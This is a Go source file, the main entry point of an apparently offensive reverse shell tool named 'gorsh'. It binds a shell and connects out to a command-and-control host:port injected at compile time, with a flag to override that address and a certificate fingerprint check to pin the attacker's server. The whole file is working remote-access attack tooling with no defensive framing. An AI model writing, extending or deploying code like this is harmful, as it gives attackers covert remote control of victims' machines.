package main

import (
	"encoding/hex"
	"flag"
	"os"
	"strings"

	"git.hyrule.link/blink/gorsh/pkg/core"
	"git.hyrule.link/blink/gorsh/pkg/myconn"
)

const (
	ErrCouldNotDecode  = 1 << iota
	ErrHostUnreachable = iota
	ErrBadFingerprint  = iota
)

var (
	connectString string
	fingerPrint   string
)

func main() {
	// make this accessible globally, through a module, so other parts
	// can reference the built in C2 host:port
	myconn.ConnectionString = connectString
	core.BindShell()

	dev := flag.Bool("dev", false, "Run the shell locally.")
	override := flag.String("connect", "", "Override compile-time-injected connectString")
	flag.Parse()

	if *dev {
		myconn.Conn = os.Stdin
		core.StartShell(&myconn.Conn)
	}

	if connectString != "" && fingerPrint != "" {
		fprint := strings.Replace(fingerPrint, ":", "", -1)
		bytesFingerprint, err := hex.DecodeString(fprint)
		if err != nil {
			os.Exit(ErrCouldNotDecode)
		}

		if *override == "" {
			core.InitReverseShell(connectString, bytesFingerprint)
		} else {
			core.InitReverseShell(*override, bytesFingerprint)
		}
	}
}
